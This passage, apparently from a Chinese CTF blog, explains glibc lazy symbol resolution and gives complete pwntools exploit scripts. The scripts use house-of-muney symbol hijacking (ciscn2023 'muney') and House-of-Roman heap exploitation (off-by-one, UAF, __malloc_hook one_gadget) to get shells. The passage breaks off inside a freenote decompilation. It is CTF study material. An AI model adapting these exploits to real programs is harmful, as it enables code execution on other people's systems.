DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)\t&#123;\t  THREAD_GSCOPE_SET_FLAG ();\t  flags |= DL_LOOKUP_GSCOPE_LOCK;\t&#125;#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)\tTHREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      /* Currently result contains the base load address (or link map)\t of the object that defines sym.  Now add in the symbol\t offset.  */      value = DL_FIXUP_MAKE_VALUE (result,\t\t\t\t   SYMBOL_ADDRESS (result, sym, false));    &#125;  else    &#123;      /* We already found the symbol.  The module (and therefore its load\t address) is also known.  */      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));      result = l;    &#125;  /* And now perhaps the relocation addend.  */  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__glibc_unlikely (GLRO(dl_bind_not)))    return value;  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);&#125;\n其中调用了_dl_lookup_symbol_x来寻找符号，实际调用了do_lookup_x，这个函数在dl-lookup.c,line358\n/* Inner part of the lookup functions.  We return a value &gt; 0 if we   found the symbol, the value 0 if nothing is found and &lt; 0 if   something bad happened.  */static int__attribute_noinline__do_lookup_x (const char *undef_name, uint_fast32_t new_hash,\t     unsigned long int *old_hash, const ElfW(Sym) *ref,\t     struct sym_val *result, struct r_scope_elem *scope, size_t i,\t     const struct r_found_version *const version, int flags,\t     struct link_map *skip, int type_class, struct link_map *undef_map)&#123;  size_t n = scope-&gt;r_nlist;  /* Make sure we read the value before proceeding.  Otherwise we     might use r_list pointing to the initial scope and r_nlist being     the value after a resize.  That is the only path in dl-open.c not     protected by GSCOPE.  A read barrier here might be to expensive.  */  __asm volatile (&quot;&quot; : &quot;+r&quot; (n), &quot;+m&quot; (scope-&gt;r_list));  struct link_map **list = scope-&gt;r_list;  do    &#123;      const struct link_map *map = list[i]-&gt;l_real;      /* Here come the extra test needed for `_dl_lookup_symbol_skip&#x27;.  */      if (map == skip)\tcontinue;      /* Don&#x27;t search the executable when resolving a copy reloc.  */      if ((type_class &amp; ELF_RTYPE_CLASS_COPY) &amp;&amp; map-&gt;l_type == lt_executable)\tcontinue;      /* Do not look into objects which are going to be removed.  */      if (map-&gt;l_removed)\tcontinue;      /* Print some debugging info if wanted.  */      if (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SYMBOLS))\t_dl_debug_printf (&quot;symbol=%s;  lookup in file=%s [%lu]\\n&quot;,\t\t\t  undef_name, DSO_FILENAME (map-&gt;l_name),\t\t\t  map-&gt;l_ns);      /* If the hash table is empty there is nothing to do here.  */      if (map-&gt;l_nbuckets == 0)\tcontinue;      Elf_Symndx symidx;      int num_versions = 0;      const ElfW(Sym) *versioned_sym = NULL;      /* The tables for this map.  */      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);      const ElfW(Sym) *sym;      const ElfW(Addr) *bitmask = map-&gt;l_gnu_bitmask;      if (__glibc_likely (bitmask != NULL))\t&#123;        //获取bitmask_word\t  ElfW(Addr) bitmask_word\t    = bitmask[(new_hash / __ELF_NATIVE_CLASS)\t\t      &amp; map-&gt;l_gnu_bitmask_idxbits];\t  unsigned int hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - 1);\t  unsigned int hashbit2 = ((new_hash &gt;&gt; map-&gt;l_gnu_shift)\t\t\t\t   &amp; (__ELF_NATIVE_CLASS - 1));\t  if (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1)\t\t\t\t&amp; (bitmask_word &gt;&gt; hashbit2) &amp; 1))\t    &#123;          //获取bucket\t      Elf32_Word bucket = map-&gt;l_gnu_buckets[new_hash\t\t\t\t\t\t     % map-&gt;l_nbuckets];\t      if (bucket != 0)\t\t&#123;            //hasharr \t\t  const Elf32_Word *hasharr = &amp;map-&gt;l_gnu_chain_zero[bucket];\t\t  do\t\t    if (((*hasharr ^ new_hash) &gt;&gt; 1) == 0)\t\t      &#123;\t\t\tsymidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr);\t\t\tsym = check_match (undef_name, ref, version, flags,\t\t\t\t\t   type_class, &amp;symtab[symidx], symidx,\t\t\t\t\t   strtab, map, &amp;versioned_sym,\t\t\t\t\t   &amp;num_versions);\t\t\tif (sym != NULL)\t\t\t  goto found_it;\t\t      &#125;\t\t  while ((*hasharr++ &amp; 1u) == 0);\t\t&#125;\t    &#125;\t  /* No symbol found.  */\t  symidx = SHN_UNDEF;\t&#125;      else\t&#123;\t  if (*old_hash == 0xffffffff)\t    *old_hash = _dl_elf_hash (undef_name);\t  /* Use the old SysV-style hash table.  Search the appropriate\t     hash bucket in this object&#x27;s symbol table for a definition\t     for the same symbol name.  */\t  for (symidx = map-&gt;l_buckets[*old_hash % map-&gt;l_nbuckets];\t       symidx != STN_UNDEF;\t       symidx = map-&gt;l_chain[symidx])\t    &#123;\t      sym = check_match (undef_name, ref, version, flags,\t\t\t\t type_class, &amp;symtab[symidx], symidx,\t\t\t\t strtab, map, &amp;versioned_sym,\t\t\t\t &amp;num_versions);\t      if (sym != NULL)\t\tgoto found_it;\t    &#125;\t&#125;      /* If we have seen exactly one versioned symbol while we are\t looking for an unversioned symbol and the version is not the\t default version we still accept this symbol since there are\t no possible ambiguities.  */      sym = num_versions == 1 ? versioned_sym : NULL;      if (sym != NULL)\t&#123;\tfound_it:\t  /* When UNDEF_MAP is NULL, which indicates we are called from\t     do_lookup_x on relocation against protected data, we skip\t     the data definion in the executable from copy reloc.  */\t  if (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA\t      &amp;&amp; undef_map == NULL\t      &amp;&amp; map-&gt;l_type == lt_executable\t      &amp;&amp; type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA)\t    &#123;\t      const ElfW(Sym) *s;\t      unsigned int i;#if ! ELF_MACHINE_NO_RELA\t      if (map-&gt;l_info[DT_RELA] != NULL\t\t  &amp;&amp; map-&gt;l_info[DT_RELASZ] != NULL\t\t  &amp;&amp; map-&gt;l_info[DT_RELASZ]-&gt;d_un.d_val != 0)\t\t&#123;\t\t  const ElfW(Rela) *rela\t\t    = (const ElfW(Rela) *) D_PTR (map, l_info[DT_RELA]);\t\t  unsigned int rela_count\t\t    = map-&gt;l_info[DT_RELASZ]-&gt;d_un.d_val / sizeof (*rela);\t\t  for (i = 0; i &lt; rela_count; i++, rela++)\t\t    if (elf_machine_type_class (ELFW(R_TYPE) (rela-&gt;r_info))\t\t\t== ELF_RTYPE_CLASS_COPY)\t\t      &#123;\t\t\ts = &amp;symtab[ELFW(R_SYM) (rela-&gt;r_info)];\t\t\tif (!strcmp (strtab + s-&gt;st_name, undef_name))\t\t\t  goto skip;\t\t      &#125;\t\t&#125;#endif#if ! ELF_MACHINE_NO_REL\t      if (map-&gt;l_info[DT_REL] != NULL\t\t  &amp;&amp; map-&gt;l_info[DT_RELSZ] != NULL\t\t  &amp;&amp; map-&gt;l_info[DT_RELSZ]-&gt;d_un.d_val != 0)\t\t&#123;\t\t  const ElfW(Rel) *rel\t\t    = (const ElfW(Rel) *) D_PTR (map, l_info[DT_REL]);\t\t  unsigned int rel_count\t\t    = map-&gt;l_info[DT_RELSZ]-&gt;d_un.d_val / sizeof (*rel);\t\t  for (i = 0; i &lt; rel_count; i++, rel++)\t\t    if (elf_machine_type_class (ELFW(R_TYPE) (rel-&gt;r_info))\t\t\t== ELF_RTYPE_CLASS_COPY)\t\t      &#123;\t\t\ts = &amp;symtab[ELFW(R_SYM) (rel-&gt;r_info)];\t\t\tif (!strcmp (strtab + s-&gt;st_name, undef_name))\t\t\t  goto skip;\t\t      &#125;\t\t&#125;#endif\t    &#125;\t  /* Hidden and internal symbols are local, ignore them.  */\t  if (__glibc_unlikely (dl_symbol_visibility_binds_local_p (sym)))\t    goto skip;\t  switch (ELFW(ST_BIND) (sym-&gt;st_info))\t    &#123;\t    case STB_WEAK:\t      /* Weak definition.  Use this value if we don&#x27;t find another.  */\t      if (__glibc_unlikely (GLRO(dl_dynamic_weak)))\t\t&#123;\t\t  if (! result-&gt;s)\t\t    &#123;\t\t      result-&gt;s = sym;\t\t      result-&gt;m = (struct link_map *) map;\t\t    &#125;\t\t  break;\t\t&#125;\t      /* FALLTHROUGH */\t    case STB_GLOBAL:\t      /* Global definition.  Just what we need.  */\t      result-&gt;s = sym;\t      result-&gt;m = (struct link_map *) map;\t      return 1;\t    case STB_GNU_UNIQUE:;\t      do_lookup_unique (undef_name, new_hash, (struct link_map *) map,\t\t\t\tresult, type_class, sym, strtab, ref,\t\t\t\tundef_map, flags);\t      return 1;\t    default:\t      /* Local symbols are ignored.  */\t      break;\t    &#125;\t&#125;skip:      ;    &#125;  while (++i &lt; n);  /* We have not found anything until now.  */  return 0;&#125;static uint_fast32_tdl_new_hash (const char *s)&#123;  uint_fast32_t h = 5381;  for (unsigned char c = *s; c != &#x27;\\0&#x27;; c = *++s)    h = h * 33 + c;  return h &amp; 0xffffffff;&#125;\n这个函数就是寻找符号的关键\n[house_of_muney]综上，伪造以下几个值就能劫持解析函数指向我们想要的函数：\nbitmask_wordbuckethasharrtarget symbol -&gt;st_value\n直接上题[ciscn2023]muneychecksec进去先找到一波“菜单”同时看到sub_401376函数\n__int64 __fastcall sub_401376(const char *a1, _BYTE *a2, int a3)&#123;  const char *v4; // rax  const char *v5; // rax  char *v6; // rax  char *v7; // rax  char *v8; // rax  char *v9; // rax  char *v11; // [rsp+18h] [rbp-28h]  char *v12; // [rsp+18h] [rbp-28h]  char *v13; // [rsp+18h] [rbp-28h]  char *v14; // [rsp+18h] [rbp-28h]  char *v15; // [rsp+18h] [rbp-28h]  char *v16; // [rsp+18h] [rbp-28h]  char *v17; // [rsp+18h] [rbp-28h]  char *v18; // [rsp+18h] [rbp-28h]  char *i; // [rsp+18h] [rbp-28h]  char *v20; // [rsp+18h] [rbp-28h]  int v21; // [rsp+20h] [rbp-20h]  _BOOL4 v22; // [rsp+24h] [rbp-1Ch]  int v23; // [rsp+28h] [rbp-18h]  const char **v24; // [rsp+30h] [rbp-10h]  if ( a3 != 1 &amp;&amp; a3 != 2 )    return 0xFFFFFFFFLL;  memset(a2, 0, 0x140uLL);  *a2 = a3;  if ( a3 == 1 )    v4 = a1;  else    v4 = 0LL;  *((_QWORD *)a2 + 1) = v4;  if ( a3 == 2 )    v5 = a1;  else    v5 = 0LL;  *((_QWORD *)a2 + 3) = v5;  v11 = strchr(a1, 32);  if ( !v11 )    return 400LL;  *v11 = 0;  v12 = v11 + 1;  v21 = 0;  if ( a3 == 1 )  &#123;    if ( !strcmp(&quot;GET&quot;, *((const char **)a2 + 1)) )      v21 = 4;    if ( !v21 &amp;&amp; !strcmp(&quot;HEAD&quot;, *((const char **)a2 + 1)) )      v21 = 5;    if ( !v21 &amp;&amp; !strcmp(&quot;POST&quot;, *((const char **)a2 + 1)) )      v21 = 5;    if ( !v21 &amp;&amp; !strcmp(&quot;PUT&quot;, *((const char **)a2 + 1)) )      v21 = 4;    if ( !v21 &amp;&amp; !strcmp(&quot;DELETE&quot;, *((const char **)a2 + 1)) )      v21 = 7;    if ( !v21 &amp;&amp; !strcmp(&quot;TRACE&quot;, *((const char **)a2 + 1)) )      v21 = 6;    if ( !v21 &amp;&amp; !strcmp(&quot;OPTIONS&quot;, *((const char **)a2 + 1)) )      v21 = 8;    if ( !v21 &amp;&amp; !strcmp(&quot;CONNECT&quot;, *((const char **)a2 + 1)) )      v21 = 8;    if ( !v21 &amp;&amp; !strcmp(&quot;PATCH&quot;, *((const char **)a2 + 1)) )      v21 = 6;    if ( !v21 )      return 400LL;  &#125;  else if ( !strcmp(&quot;HTTP/1.0&quot;, *((const char **)a2 + 3)) &amp;&amp; !strcmp(&quot;HTTP/1.1&quot;, *((const char **)a2 + 3)) )  &#123;    return 400LL;  &#125;  if ( a3 == 1 )    v6 = v12;  else    v6 = 0LL;  *((_QWORD *)a2 + 2) = v6;  if ( a3 == 2 )    v7 = v12;  else    v7 = 0LL;  *((_QWORD *)a2 + 4) = v7;  v13 = strchr(v12, 32);  if ( !v13 )    return 414LL;  *v13 = 0;  v14 = v13 + 1;  if ( a3 == 1 &amp;&amp; strchr(*((const char **)a2 + 2), 47) != *((char **)a2 + 2) )    return 400LL;  if ( a3 == 2 &amp;&amp; !atoi(*((const char **)a2 + 4)) )    return 400LL;  if ( a3 == 1 )    v8 = v14;  else    v8 = (char *)*((_QWORD *)a2 + 3);  *((_QWORD *)a2 + 3) = v8;  if ( a3 == 2 )    v9 = v14;  else    v9 = 0LL;  *((_QWORD *)a2 + 5) = v9;  v15 = strchr(v14, 10);  if ( !v15 )    return 400LL;  *v15 = 0;  v16 = v15 + 1;  if ( *v16 == 13 )    *v16++ = 0;  if ( a3 == 1 &amp;&amp; !strcmp(&quot;HTTP/1.0&quot;, *((const char **)a2 + 3)) &amp;&amp; !strcmp(&quot;HTTP/1.1&quot;, *((const char **)a2 + 3)) )    return 400LL;  v22 = 0;  v23 = 0;  while ( !*v16 || *v16 != 10 &amp;&amp; (*v16 != 13 || v16[1] != 10) )  &#123;    if ( v23 &lt;= 15 )      *(_QWORD *)&amp;a2[16 * v23 + 48] = v16;    v18 = strchr(v16, 58);    if ( !v18 )      return 413LL;    *v18 = 0;    for ( i = v18 + 1; *i &amp;&amp; (*i == 32 || *i == 13 || *i == 10 || *i == 9); ++i )      *i = 0;    if ( !*i )      return 413LL;    if ( v23 &lt;= 15 )      *(_QWORD *)&amp;a2[16 * v23 + 56] = i;    v20 = strchr(i, 10);    if ( !v20 )      return 413LL;    *v20 = 0;    v16 = v20 + 1;    if ( *v16 == 13 )      *v16++ = 0;    v24 = (const char **)&amp;a2[16 * v23 + 48];    if ( a3 == 1 )    &#123;      if ( !strcasecmp(&quot;Connection&quot;, *v24) )      &#123;        if ( *(_BYTE *)(*((_QWORD *)a2 + 3) + 7LL) == 48 &amp;&amp; !strcasecmp(&quot;Keep-Alive&quot;, v24[1]) )        &#123;          a2[313] = 1;        &#125;        else if ( *(_BYTE *)(*((_QWORD *)a2 + 3) + 7LL) == 49 &amp;&amp; !strcasecmp(&quot;Close&quot;, v24[1]) )        &#123;          a2[313] = 0;        &#125;        a2[312] = a2[313] == 0;      &#125;      if ( !strcasecmp(&quot;Accept-Encoding&quot;, *v24) &amp;&amp; strstr(v24[1], &quot;gzip&quot;) )        a2[314] = 1;      if ( !strcasecmp(&quot;Content-Length&quot;, *v24) )        *((_DWORD *)a2 + 79) = atoi(v24[1]);      if ( !v22 )        v22 = strcasecmp(&quot;Host&quot;, *v24) == 0;    &#125;    ++v23;  &#125;  *v16 = 0;  v17 = v16 + 1;  if ( *v17 == 10 )    *v17++ = 0;  if ( a3 != 1 )    goto LABEL_126;  if ( !a2[313] &amp;&amp; !a2[312] )  &#123;    a2[313] = *(_BYTE *)(*((_QWORD *)a2 + 3) + 7LL) != 48;    a2[312] = a2[313] == 0;  &#125;  if ( *(_BYTE *)(*((_QWORD *)a2 + 3) + 7LL) == 49 &amp;&amp; !v22 )    return 400LL;LABEL_126:  *((_QWORD *)a2 + 38) = v17;  return 0LL;&#125;\n主要就是对输入的解析，可知要以http请求头的格式来输入，格式如下：\ndef menu(content):    p.sendafter(&#x27;HTTP_Parser&gt; &#x27;, content)def add(size):    header = f&#x27;&#x27;&#x27;POST /create HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipSize: &#123;size&#125;Content-Length: &#123;str(0x80)&#125;\\n&#x27;&#x27;&#x27;    payload = header + &#x27;a&#x27; * 0x80    menu(payload)def edit(index, offset, length, content):    header = f&#x27;&#x27;&#x27;POST /edit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipContent-Length: &#123;length&#125;Idx: &#123;index&#125;Offset: &#123;offset&#125;\\n&#x27;&#x27;&#x27;    payload = header.encode() + content    menu(payload)def delete(index):    header = f&#x27;&#x27;&#x27;POST /delete HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipIdx: &#123;index&#125;\\n&#x27;&#x27;&#x27;    menu(header)def quit():    header = f&#x27;&#x27;&#x27;POST /quit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzip\\n&#x27;&#x27;&#x27;\n再看到“create”的规则发现申请的堆块最小为0x100000，因此我们申请的堆块都会走mmap。mmap申请的内存一般位于libc.so.6内存的低地址处。如果可以修改mmap申请的这段内存的size，那么我们再次申请回来就可以覆盖掉libc.so.6的符号表\nedit函数里发现了一处漏洞：这里没有对负数进行检查，edit可以向低地址方向写入数据。\n因此，先申请一个堆块，再利用edit中的洞修改其size，free掉该堆块后再次申请它，就能造成任意写\n有一处exit(“&#x2F;bin&#x2F;sh”)\n可以劫持函数解析，将exit解析为system即可实现system(“&#x2F;bin&#x2F;sh”)\n接下来去找那几个需要伪造的值的位置\nbitmask_wordbuckethasharrtarget symbol -&gt;st_value\n使用glibc源码级的调试，脚本如下：\nfrom pwn import *from pwn import p64, p32, p16, p8context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./muney&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)p = process([&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;,&quot;./muney&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)#p = process([&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;,&quot;./sys1&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)def menu(content):    p.sendafter(&#x27;HTTP_Parser&gt; &#x27;, content)def debug(s=&#x27;&#x27;):    gdb.attach(p, s)    pause()def quit():    header = f&#x27;&#x27;&#x27;POST /quit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzip\\n&#x27;&#x27;&#x27;    menu(header)cmd = &quot;&quot;&quot;dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elfb do_lookup_xb exit&quot;&quot;&quot;debug(cmd)quit()p.interactive()\n这个位置的while (++i &lt; n);需要先过一次然后开始找那几个值\n还需要找到system的st_value和st_name,还是用这个简单的程序\n//gcc sys1.c -fno-pie -g -o sys1#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;char *buff;read(0,buff,0x15);//为了让程序长一点好下断点system(&quot;/bin/sh&quot;);return 0;&#125;\n\nexp:\nfrom pwn import *from pwn import p64, p32, p16, p8context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./muney&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)p = process([&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;,&quot;./muney&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)def debug(s=&#x27;&#x27;):    gdb.attach(p, s)    pause()lg = lambda x, y: log.success(f&#x27;&#123;x&#125;: &#123;hex(y)&#125;&#x27;)def menu(content):    p.sendafter(&#x27;HTTP_Parser&gt; &#x27;, content)def add(size):    header = f&#x27;&#x27;&#x27;POST /create HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipSize: &#123;size&#125;Content-Length: &#123;str(0x80)&#125;\\n&#x27;&#x27;&#x27;    payload = header + &#x27;a&#x27; * 0x80    menu(payload)def edit(index, offset, length, content):    header = f&#x27;&#x27;&#x27;POST /edit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipContent-Length: &#123;length&#125;Idx: &#123;index&#125;Offset: &#123;offset&#125;\\n&#x27;&#x27;&#x27;    payload = header.encode() + content    menu(payload)def delete(index):    header = f&#x27;&#x27;&#x27;POST /delete HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipIdx: &#123;index&#125;\\n&#x27;&#x27;&#x27;    menu(header)def quit():    header = f&#x27;&#x27;&#x27;POST /quit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzip\\n&#x27;&#x27;&#x27;    menu(header)command = &quot;&quot;&quot;dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elfdir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elfdir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elf/dl-lookup.cb *0x4021CA&quot;&quot;&quot;debug(command)# quit()bitmask_offset = 0xb88bucket_offset = 0xcb0hasharr_offset = 0x1d7cexit_sym_offset = 0x4d20bitmask_word = 0xf000028c0200130ebucket = 0x86hasharr = 0x7c967e3e7c93f2a0exit_sym = 0x000f001200002efbst_value = 0x52290  # system offset libc baseadd(0x200000)edit(0, -8, 3, b&#x27;\\x02\\x10\\x21&#x27;)delete(0)add(0x211002)mmap_offset_libc = 0x201ff0edit(0, mmap_offset_libc + bitmask_offset, 2, p16(bitmask_word &amp; 0xffff))edit(0, mmap_offset_libc + bitmask_offset + 3, 2, p16(bitmask_word &gt;&gt; 24 &amp; 0xffff))edit(0, mmap_offset_libc + bitmask_offset + 5, 1, p16(bitmask_word &gt;&gt; 40 &amp; 0xff))edit(0, mmap_offset_libc + bitmask_offset + 7, 1, p16(bitmask_word &gt;&gt; 56 &amp; 0xff))edit(0, mmap_offset_libc + bucket_offset, 1, p8(bucket))edit(0, mmap_offset_libc + hasharr_offset, 8, p64(hasharr))edit(0, mmap_offset_libc + exit_sym_offset - 8, 2, p16(exit_sym &amp; 0xffff))edit(0, mmap_offset_libc + exit_sym_offset - 8 + 4, 1, p8(exit_sym &gt;&gt; 32 &amp; 0xff))edit(0, mmap_offset_libc + exit_sym_offset - 8 + 6, 1, p8(exit_sym &gt;&gt; 48 &amp; 0xff))edit(0, mmap_offset_libc + exit_sym_offset, 3, p32(st_value)[:-1])# debug()quit()p.interactive()\n\n\n\n","tags":["heap"]},{"title":"house_of_roman","url":"/2023/11/15/house-of-roman/","content":"刷how2heap的时候看到的一个好玩的打法，本地环境貌似复现不起来，仅作记录程序来源https://github.com/romanking98/House-Of-RomanHouse-Of-RomanRCE through Leakless HeapFengShui, fastbin alloc anywhere.Was presented at DEFCON 26.\n[House-Of-Roman]new_chall开局有个能写入bss段的机会bss实现了增删改malloc_chunk，没有限制size，只能申请19个chunk\n__int64 malloc_chunk()&#123;  unsigned int v1; // [rsp+0h] [rbp-10h] BYREF  _DWORD size[3]; // [rsp+4h] [rbp-Ch] BYREF  printf(&quot;Enter size of chunk :&quot;);  __isoc99_scanf(&quot;%d&quot;, size);  printf(&quot;Enter index :&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0x13 )  &#123;    *(_QWORD *)&amp;size[1] = malloc(size[0]);    heap_ptrs[v1] = *(_QWORD *)&amp;size[1];    sizes[v1] = size[0];    return *(_QWORD *)&amp;size[1];  &#125;  else  &#123;    puts(&quot;Invalid index&quot;);    return 0LL;  &#125;&#125;\nwrite_chunk,存在off_by_one漏洞\nint write_chunk()&#123;  unsigned int v1; // [rsp+8h] [rbp-8h] BYREF  int v2; // [rsp+Ch] [rbp-4h]  printf(&quot;\\nEnter index of chunk :&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &gt; 0x13 )    return puts(&quot;\\nInvalid index&quot;);  if ( !heap_ptrs[v1] )    return puts(&quot;Bad index&quot;);  v2 = sizes[v1];  printf(&quot;Enter data :&quot;);  return read(0, (void *)heap_ptrs[v1], v2 + 1);//off_by_one&#125;\nfree_chunk存在UAF\nvoid free_chunk()&#123;  unsigned int v0; // [rsp+Ch] [rbp-4h] BYREF  printf(&quot;\\nEnter index :&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v0);  if ( v0 &lt;= 0x13 )    free((void *)heap_ptrs[v0]);&#125;\n\nexp解说链接:https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc\nfrom pwn import *from pwn import p64p = process(&quot;./new_chall&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.24.so&quot;&#125;)#raw_input()def debug():\tgdb.attach(p)\tpause()def menu():\tp.recvuntil(b&quot;3. Free&quot;)def create(size,idx):\tmenu()\tp.sendline(b&quot;1&quot;)\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(size))\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(idx))def free(idx):\tmenu()\tp.sendline(b&quot;3&quot;)\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(idx))def edit(idx,data):\tmenu()\tp.sendline(b&quot;2&quot;)\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(idx))\tsleep(0.1)\tp.send(data)name = b&quot;A&quot;*20p.recvlineuntil(b&quot;Enter name :&quot;)p.sendline(name)debug()create(24,0)create(200,1)fake = b&quot;A&quot;*104fake += p64(0x61)edit(1,fake)create(101,2)free(1)create(200,1)over = b&quot;A&quot;*24over += b&quot;\\x71&quot;edit(0,over)create(101,3)create(101,15)create(101,16)create(101,17)create(101,18)create(101,19)free(2)free(3)heap_po = b&quot;\\x20&quot;edit(3,heap_po)arena_po = b&quot;\\xcd\\x4a&quot;edit(1,arena_po)#raw_input()create(101,0)create(101,0)create(101,0)#p.interactive()# Control arena through 0.# Now unsorted bin attack.# First fix 0x71 freelist.free(15)edit(15,p64(0x00))# Fixed.# 0x7f702619777bcreate(200,1)create(200,1)create(24,2)create(200,3)create(200,4)free(1)po = b&quot;B&quot;*8po += b&quot;\\xe0\\x4a&quot;edit(1,po)create(200,1)#5b394fover = b&quot;R&quot;*19over += b&quot;\\x4f\\x39\\x5b&quot;edit(0,over)create(200,7)try:\tresp = p.recv(4, timeout=6)\tp.interactive()except:\tp.close()\n\n该方法在aslr开启下需要爆破数据，看运气以下方法来自https://xz.aliyun.com/t/7426#toc-1用IO_FILE泄露了libc地址，有1&#x2F;16的概率打通\n#coding:utf8from pwn import*def add(size,idx):    #p.sendline(&quot;1&quot;)    #p.sendline(str(size))    #p.sendline(str(idx))    p.sendlineafter(&#x27;Free&#x27;,&quot;1&quot;)    p.sendlineafter(&#x27;Enter size of chunk :&#x27;,str(size))    p.sendlineafter(&#x27;Enter index :&#x27;,str(idx))def free(idx):    p.sendlineafter(&#x27;Free&#x27;,&quot;3&quot;)    p.sendlineafter(&#x27;Enter index :&#x27;,str(idx))def edit(idx,data):    #p.recvuntil(&#x27;Free&#x27;)    #p.sendline(&#x27;2&#x27;)    #p.recvuntil(&#x27;Enter index of chunk :&#x27;)    #p.sendline(str(idx))    #p.recvuntil(&#x27;Enter data :&#x27;)    #p.send(data)    p.sendlineafter(&#x27;Free&#x27;,&quot;2&quot;)    p.sendlineafter(&#x27;Enter index of chunk :&#x27;,str(idx))    p.sendafter(&#x27;Enter data :&#x27;,data)p = process(&#x27;./new_chall&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;,checksec=False)context.log_level =&#x27;DEBUG&#x27;p.sendlineafter(&#x27;Enter name :&#x27;,&#x27;FMYY&#x27;)add(0x18,0)add(0xC8,1)add(0x68,2)edit(1,&#x27;\\x00&#x27;*0x68 + p64(0x61))free(1)add(0xC8,1)add(0x68,3)add(0x68,4)add(0x68,5)edit(0,&#x27;\\x00&#x27;*0x18 + &#x27;\\x71&#x27;)free(2)free(3)edit(3,&#x27;\\x20&#x27;)edit(1,&#x27;\\xDD\\x25&#x27;)add(0x68,9)add(0x68,9)payload = &#x27;\\x00&#x27;*0x33 + p64(0xFBAD1800) + p64(0)*3 + &#x27;\\x88&#x27;add(0x68,9)edit(9,payload)#修改stdout的flag位为0xfbad1800#bing将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;).ljust(8,&#x27;\\x00&#x27;)) - libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]libc.address = libc_basefree(4)edit(4,p64(0))add(0x68,0)free(0)edit(0,p64(libc.symbols[&#x27;__malloc_hook&#x27;] - 0x23))add(0x68,0)add(0x68,0)p.sendlineafter(&#x27;Free&#x27;,&#x27;2&#x27;)p.sendlineafter(&#x27;Enter index of chunk :&#x27;,&#x27;0&#x27;)p.send(&#x27;\\x00&#x27;*0x13+p64(libc_base+0xF02A4))#向malloc_hook 地址里写入 onegadget #free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。free(1)free(1)p.interactive()\n\n#[0CTF&#x2F;TCTF 2018 finals]freenote2018增删改（查只是个壳子）init_note 限制了15个chunk，size为0x1到0x100\n__int64 sub_B4E()&#123;  unsigned int v1; // [rsp+Ch] [rbp-124h]  unsigned int v2; // [rsp+10h] [rbp-120h]  int v3; // [rsp+14h] [rbp-11Ch]  void *dest; // [rsp+18h] [rbp-118h]  char buf[264]; // [rsp+20h] [rbp-110h] BYREF  unsigned __int64 v6; // [rsp+128h] [rbp-8h]  v6 = __readfsqword(0x28u);  v1 = 0;  if ( (unsigned int)dword_20203C &lt;= 0xF &amp;&amp; (printf(&quot;Input the note length:&quot;), v3 = sub_A80(), v3 &gt; 0) &amp;&amp; v3 &lt;= 256 )  &#123;    